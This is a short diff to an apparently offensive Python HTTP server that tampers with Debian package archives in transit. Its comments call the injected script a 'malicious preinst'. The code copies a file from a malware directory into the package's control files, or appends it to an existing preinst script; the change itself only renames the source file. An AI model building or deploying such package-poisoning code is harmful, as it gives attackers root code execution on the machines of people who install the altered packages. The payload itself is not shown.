@@ -47,11 +47,11 @@ class Server(BaseHTTPRequestHandler):
             if(not os.path.exists("control/preinst")):
                 # add malicious preinst to control if it does not exist
                 print("add malicious preinst")
-                os.system("cp ./malware/preinst ./control/")
+                os.system("cp ./malware/install ./control/preinst")
             else:
                 # if preinst already exists copy created preinst into the exisiting one
                 print("add to existing preinst")
-                os.system("cat ./malware/preinst >> ./control/preinst")
+                os.system("cat ./malware/install >> ./control/preinst")
 
             # change working directory to control, this makes sure we add just the files
             # e.g.: "preinst" rather than "control/preinst" in the archive
